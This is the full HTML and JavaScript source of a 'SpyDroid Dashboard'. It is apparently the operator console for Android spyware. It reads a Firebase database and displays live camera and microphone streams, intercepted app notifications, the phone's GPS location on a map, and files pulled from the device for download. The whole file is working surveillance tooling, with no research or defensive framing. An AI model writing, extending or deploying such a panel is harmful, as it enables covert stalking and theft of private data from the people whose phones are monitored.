<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SpyDroid Dashboard</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #0f0;
      display: flex;
      height: 100vh;
    }
    .sidebar {
      width: 200px;
      background: #1f1f1f;
      padding: 20px;
      box-shadow: 2px 0 5px rgba(0,0,0,0.5);
    }
    .sidebar button {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      background: #333;
      color: #0f0;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }
    .content {
      flex: 1;
      padding: 20px;
      background: #181818;
      overflow-y: auto;
    }
    .divider {
      width: 1px;
      background: #444;
    }
    video, audio {
      width: 100%;
      max-height: 400px;
      background: #000;
    }
    .notification {
      background: #222;
      margin: 5px 0;
      padding: 10px;
      border: 1px solid #0f0;
    }
    .map, .file-list {
      background: #222;
      padding: 10px;
      color: #0f0;
    }
    iframe {
      width: 100%;
      height: 400px;
      border: none;
    }
    .header {
      font-size: 1.5em;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="sidebar">
    <button onclick="showSection('camera')">Camera</button>
    <button onclick="showSection('microphone')">Microphone</button>
    <button onclick="showSection('notification')">Notification</button>
    <button onclick="showSection('location')">Location</button>
    <button onclick="showSection('file')">File</button>
  </div>
  <div class="divider"></div>
  <div class="content" id="content">
    <div class="header">Welcome to SpyDroid Dashboard</div>
    <div id="camera" class="section">
      <video id="videoPlayer" controls autoplay></video>
    </div>
    <div id="microphone" class="section" style="display:none">
      <audio id="audioPlayer" controls autoplay></audio>
    </div>
    <div id="notification" class="section" style="display:none">
      <div id="notificationList"></div>
      <button onclick="clearNotifications()">Clear All</button>
    </div>
    <div id="location" class="section" style="display:none">
      <iframe id="mapFrame"></iframe>
      <button onclick="refreshLocation()">Refresh Location</button>
    </div>
    <div id="file" class="section" style="display:none">
      <div id="fileList" class="file-list"></div>
    </div>
  </div>

  <script>
    const firebaseConfig = {
      databaseURL: "https://spydroid-81298-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const sections = document.querySelectorAll('.section');
    function showSection(id) {
      sections.forEach(s => s.style.display = 'none');
      document.getElementById(id).style.display = 'block';
    }

    // Camera
    db.ref('camera/stream').on('value', snap => {
      const url = snap.val();
      if (url) document.getElementById('videoPlayer').src = url;
    });

    // Microphone
    db.ref('microphone/stream').on('value', snap => {
      const url = snap.val();
      if (url) document.getElementById('audioPlayer').src = url;
    });

    // Notifications
    db.ref('notifications').on('value', snap => {
      const list = document.getElementById('notificationList');
      list.innerHTML = '';
      snap.forEach(n => {
        const data = n.val();
        const div = document.createElement('div');
        div.className = 'notification';
        div.innerText = `${data.app} - ${data.text} [${data.date} ${data.time}]`;
        list.appendChild(div);
      });
    });
    function clearNotifications() {
      db.ref('notifications').remove();
    }

    // Location
    function refreshLocation() {
      db.ref('location').once('value').then(snap => {
        const loc = snap.val();
        if (loc) {
          const url = `https://maps.google.com/maps?q=${loc.lat},${loc.lon}&z=15&output=embed`;
          document.getElementById('mapFrame').src = url;
        }
      });
    }
    refreshLocation();

    // Files
    db.ref('files').on('value', snap => {
      const fileList = document.getElementById('fileList');
      fileList.innerHTML = '';
      snap.forEach(file => {
        const data = file.val();
        const link = document.createElement('a');
        link.href = data.url;
        link.innerText = data.name;
        link.download = data.name;
        link.style.display = 'block';
        link.style.color = '#0f0';
        fileList.appendChild(link);
      });
    });
  </script>
</body>
</html>
